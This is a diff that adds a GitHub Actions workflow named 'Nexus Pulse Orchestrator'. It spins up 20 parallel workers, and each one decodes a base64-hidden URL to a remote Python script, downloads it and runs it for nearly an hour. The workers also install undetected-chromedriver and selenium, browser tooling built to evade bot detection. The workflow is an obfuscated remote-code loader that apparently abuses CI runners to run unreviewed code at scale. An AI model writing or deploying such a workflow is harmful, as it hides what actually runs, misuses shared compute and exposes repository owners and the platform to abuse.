@@ -1,0 +1,100 @@
+name: Nexus Pulse Orchestrator
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: nexus-batch-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # *****************************************************************
+  # Lifecycle Guard: terminates the workflow run after 59 minutes
+  # *****************************************************************
+  pulse-guardian:
+    name: "Pulse Guardian"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_LIFETIME: 3540
+    steps:
+      - name: Start Lifecycle Timer
+        run: |
+          echo "[GUARD] Monitoring workflow ID: ${{ github.run_id }}"
+          echo "[GUARD] Countdown initiated for ${MAX_LIFETIME} seconds..."
+
+          sleep "${MAX_LIFETIME}"
+
+          echo "[GUARD] Limit reached — issuing workflow cancellation request."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[GUARD] Cancellation request completed."
+
+  # *****************************************************************
+  # Worker Pool: parallel matrix execution across instance IDs
+  # *****************************************************************
+  worker-pool:
+    name: "Worker-${{ matrix.instance_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        instance_id: [
+          "X01A", "X02B", "X03C", "X04D", "X05E",
+          "Y06F", "Y07G", "Y08H", "Y09J", "Y10K",
+          "Z11L", "Z12M", "Z13N", "Z14P", "Z15Q",
+          "W16R", "W17S", "W18T", "W19U", "W20V"
+        ]
+
+    steps:
+      # >>> Phase A: System Preparation
+      - name: Prepare Host Machine
+        run: |
+          echo "[INIT] Initializing host for Worker-${{ matrix.instance_id }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # >>> Phase B: Script Acquisition
+      - name: Fetch Runtime Script
+        run: |
+          echo "[FETCH] Pulling runtime script from remote storage..."
+          REMOTE_LOC=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$REMOTE_LOC" -o app_runner.py
+          echo "[FETCH] Runtime script ready."
+
+      # >>> Phase C: Package Installation
+      - name: Install Python Dependencies
+        run: |
+          echo "[DEPS] Installing required Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # >>> Phase D: Process Execution & Timeout Control
+      - name: Execute Runtime Script
+        run: |
+          echo "=== Launching Worker-${{ matrix.instance_id }} process ==="
+
+          python3 app_runner.py &
+          RUNNER_PID=$!
+
+          echo "=== Process running (PID: $RUNNER_PID) | Cap: 3540s ==="
+
+          sleep 3540
+
+          if kill -0 "$RUNNER_PID" 2>/dev/null; then
+            echo "=== Cap reached — stopping PID $RUNNER_PID ==="
+            kill -9 "$RUNNER_PID"
+            echo "=== Process stopped by supervisor ==="
+          else
+            echo "=== Process exited prior to timeout ==="
+          fi
